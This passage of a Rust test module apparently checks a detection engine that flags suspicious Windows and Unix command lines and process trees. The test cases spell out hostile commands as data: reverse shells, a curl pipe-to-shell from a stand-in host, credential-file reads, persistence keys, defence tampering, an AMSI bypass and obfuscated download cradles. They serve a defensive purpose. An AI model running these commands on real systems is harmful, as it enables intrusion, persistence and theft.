            ("nltest /domain_trusts /all_trusts", "nltest_trusts"),
            (
                "netsh advfirewall set allprofiles state off",
                "firewall_disable",
            ),
            (
                "netsh interface portproxy add v4tov4 listenport=8443 connectaddress=10.0.0.5 connectport=3389",
                "portproxy",
            ),
            (
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\u.exe",
                "run_key_persistence",
            ),
            (
                "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe",
                "accessibility_backdoor",
            ),
            (
                "sc.exe create evilsvc binPath= C:\\Users\\Public\\svc.exe start= auto",
                "service_create",
            ),
            ("PsExec64.exe \\\\10.0.0.7 -s -accepteula cmd.exe", "psexec"),
            (
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "defender_tamper",
            ),
            (
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
                "amsi_bypass",
            ),
            ("net stop WinDefend", "stop_security_service"),
            (
                "cmd.exe /c echo abcdef > \\\\.\\pipe\\abcdef",
                "pipe_impersonation",
            ),
            (
                "7z.exe a -pS3cret -mhe=on loot.7z C:\\data",
                "archive_password",
            ),
            ("invoice.pdf.exe", "double_extension"),
            ("fsutil usn deletejournal /d C:", "usn_journal_delete"),
            ("Rubeus.exe kerberoast /outfile:h.txt", "kerberoast"),
            ("SharpHound.exe -c All", "bloodhound"),
        ];
        for (cmd, want) in cases {
            let a = analyze_command_line(cmd);
            assert!(
                ids(&a).contains(want),
                "{cmd} -> {:?} (wanted {want})",
                ids(&a)
            );
        }
    }

    #[test]
    fn unix_heuristics() {
        let cases: &[(&str, &str)] = &[
            (
                "curl -fsSL http://evil.example/i.sh | sudo bash",
                "pipe_to_shell",
            ),
            ("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "reverse_shell"),
            ("nc -e /bin/sh 203.0.113.5 4444", "netcat_exec"),
            (
                "python3 -c 'import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)'",
                "python_reverse_shell",
            ),
            ("echo ZWNobyBoaQ== | base64 -d | sh", "base64_to_shell"),
            ("unset HISTFILE; history -c", "history_tamper"),
            ("chmod +x /tmp/.x/kworker && /tmp/.x/kworker", "chmod_tmp"),
            ("cat /etc/shadow", "shadow_file_access"),
            (
                "echo ssh-rsa AAAA >> /root/.ssh/authorized_keys",
                "ssh_key_persistence",
            ),
            ("iptables -F", "firewall_flush_unix"),
            ("setenforce 0", "selinux_disable"),
            ("useradd -m -s /bin/bash svc", "unix_account_create"),
        ];
        for (cmd, want) in cases {
            let a = analyze_command_line(cmd);
            assert!(
                ids(&a).contains(want),
                "{cmd} -> {:?} (wanted {want})",
                ids(&a)
            );
        }
    }

    #[test]
    fn obfuscation_detection() {
        let a = analyze_command_line("c^m^d /c p^o^w^e^r^s^h^e^l^l -c whoami");
        assert!(ids(&a).contains(&"caret_obfuscation"));
        let a = analyze_command_line("powershell I`E`X (n`e`w-object net.webclient)");
        assert!(ids(&a).contains(&"backtick_obfuscation"));
        let a = analyze_command_line("powershell \"Write-Host `n done`t\"");
        assert!(!ids(&a).contains(&"backtick_obfuscation"));
        let a = analyze_command_line("powershell ('Down'+'load'+'Str'+'ing')");
        assert!(ids(&a).contains(&"concat_obfuscation"));
        let a = analyze_command_line("powershell ([char]73+[char]69+[char]88)");
        assert!(ids(&a).contains(&"charcode_obfuscation"));
        let a = analyze_command_line("cmd /c %COMSPEC:~-16,1%%COMSPEC:~-1%");
        assert!(ids(&a).contains(&"env_var_obfuscation"));
        let a = analyze_command_line("pOwErShElL -c dir");
        assert!(ids(&a).contains(&"random_case"));
        let a = analyze_command_line("PowerShell -c dir");
        assert!(!ids(&a).contains(&"random_case"));
        let a = analyze_command_line("powershell \"{2}{0}{1}\" -f 'ad','String','Downlo'");
        assert!(ids(&a).contains(&"format_obfuscation"));
    }

    #[test]
    fn base64_literal_and_entropy() {
        let inner = STANDARD.encode("cmd.exe /c vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no");
        let a = analyze_command_line(&format!("loader.exe --cfg {inner}"));
        assert!(ids(&a).contains(&"base64_payload"), "{:?}", ids(&a));
        assert!(ids(&a).contains(&"shadow_copy_delete"));
        assert!(
            a.findings
                .iter()
                .any(|f| f.id == "shadow_copy_delete" && f.evidence.starts_with("[decoded]"))
        );
        // Random bytes: high entropy but not text.
        let noise = "Xk9qL2pZ8vR3tW7yB1nM4cF6hJ0dS5gA+QeUoIzTxKbVwYrNlEpCaDsGfHjL/mOi";
        let a = analyze_command_line(&format!("tool.exe {noise}"));
        let i = ids(&a);
        assert!(
            i.contains(&"high_entropy_token") || i.contains(&"base64_payload"),
            "{i:?}"
        );
        assert!(shannon_entropy("aaaa") < 0.01);
        assert!((shannon_entropy("ab") - 1.0).abs() < 1e-9);
    }

    #[test]
    fn decode_helpers() {
        assert_eq!(
            decode_base64_text(&ps_enc("whoami")).as_deref(),
            Some("whoami")
        );
        assert_eq!(
            decode_base64_text("aGVsbG8gd29ybGQ").as_deref(),
            Some("hello world")
        );
        assert_eq!(
            decode_base64_text("aGVsbG8gd29ybGQ=").as_deref(),
            Some("hello world")
        );
        assert!(decode_base64_text("////////////").is_none());
        assert_eq!(
            command_executable("\"C:\\Program Files\\X\\a b.exe\" -x").as_deref(),
            Some("a b.exe")
        );
        assert_eq!(
            command_executable("cmd.exe /c dir").as_deref(),
            Some("cmd.exe")
        );
        assert_eq!(command_executable("   "), None);
    }

    #[test]
    fn process_tree_findings() {
        let a = analyze_process(&ProcessContext {
            image: Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
            parent_image: Some("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
            command_line: Some("powershell -w hidden -c iex(iwr http://evil.example/a)"),
            parent_command_line: None,
        });
        assert!(ids(&a).contains(&"office_spawns_shell"));
        assert!(a.score >= 80);

        let a = analyze_process(&ProcessContext {
            image: Some("C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe"),
            parent_image: Some("C:\\Windows\\explorer.exe"),
            command_line: Some("C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe"),
            parent_command_line: None,
        });
        let i = ids(&a);
        assert!(i.contains(&"masquerade_location"), "{i:?}");
        assert!(i.contains(&"unexpected_parent"), "{i:?}");
        assert!(i.contains(&"user_writable_image"), "{i:?}");

        let a = analyze_process(&ProcessContext {
            image: Some("C:\\ProgramData\\scvhost.exe"),
            ..Default::default()
        });
        assert!(ids(&a).contains(&"masquerade_typo"));

        let ok = analyze_process(&ProcessContext {
            image: Some("C:\\Windows\\System32\\svchost.exe"),
            parent_image: Some("C:\\Windows\\System32\\services.exe"),
            command_line: Some("C:\\Windows\\system32\\svchost.exe -k LocalService -p"),
            parent_command_line: None,
        });
        assert!(ok.findings.is_empty(), "{:?}", ids(&ok));
        let ok = analyze_process(&ProcessContext {
            image: Some("C:\\Windows\\System32\\taskhostw.exe"),
            ..Default::default()
        });
        assert!(ok.findings.is_empty());

        let a = analyze_process(&ProcessContext {
            image: Some("C:\\Windows\\System32\\rundll32.exe"),
            command_line: Some("\"C:\\Windows\\System32\\rundll32.exe\""),
            ..Default::default()
        });
        assert!(ids(&a).contains(&"rundll32_no_args"));

        let a = analyze_process(&ProcessContext {
            image: Some("C:\\Windows\\System32\\cmd.exe"),
            parent_image: Some("C:\\Windows\\System32\\inetsrv\\w3wp.exe"),
            command_line: Some("cmd.exe /c whoami"),
            parent_command_line: None,
        });
        assert!(ids(&a).contains(&"webserver_spawns_shell"));
    }

    #[test]
    fn score_is_monotonic_noisy_or() {
        let base = analyze_command_line("whoami");
        let more = analyze_command_line("whoami /all & net user /domain & nltest /dclist:corp");
        assert!(more.score >= base.score);
        assert!(more.score <= 100);
        assert_eq!(edit_distance("svchost", "scvhost"), 1);
        assert_eq!(edit_distance("lsass", "lsasss"), 1);
        assert_eq!(edit_distance("abc", "abc"), 0);
    }

    #[test]
    fn large_and_adversarial_input_is_bounded() {
        let token = STANDARD.encode("cmd /c whoami /all & net user /domain & nltest /dclist:x");
        let many = vec![token; 200].join(" ");
        let a = analyze_command_line(&many);
        assert!(a.decoded.len() <= MAX_PAYLOADS);
        assert!(ids(&a).contains(&"base64_payload"));
        let huge = "powershell -c ".to_string() + &"A1b2C3d4/".repeat(40_000);
        let start = std::time::Instant::now();
        let a = analyze_command_line(&huge);
        assert!(a.length <= MAX_ANALYZED_LEN);
        assert!(start.elapsed().as_secs() < 20, "{:?}", start.elapsed());
        let _ = analyze_command_line("\u{1f600}".repeat(100_000).as_str());
        assert_eq!(decode_base64_text("\u{e9}\u{e9}\u{e9}\u{e9}"), None);
    }
}
